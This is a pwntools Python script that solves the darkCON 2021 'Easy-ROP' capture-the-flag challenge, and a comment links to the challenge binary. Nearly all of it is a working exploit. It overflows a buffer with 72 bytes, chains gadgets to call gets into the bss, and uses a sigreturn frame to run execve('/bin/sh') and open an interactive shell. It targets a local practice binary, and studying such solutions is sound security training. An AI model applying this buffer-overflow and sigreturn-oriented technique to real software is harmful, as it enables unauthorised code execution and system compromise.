#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('easy-rop',checksec=False)
p = elf.process()

pop_rax = 0x00000000004175eb
pop_rdi = 0x000000000040191a
syscall = 0x000000000041e394
bss = 0x00000000004c2220

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bss
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

payload = b'A'*72
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(elf.sym['gets'])
payload += p64(pop_rax)
payload += p64(0xf) # sig return syscall
payload += p64(syscall)
payload += bytes(frame)

open('payload','wb').write(payload)
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()

# https://github.com/sajjadium/ctf-archives/raw/main/darkCON/2021/pwn/Easy-ROP/easy-rop
# challenge download link ^
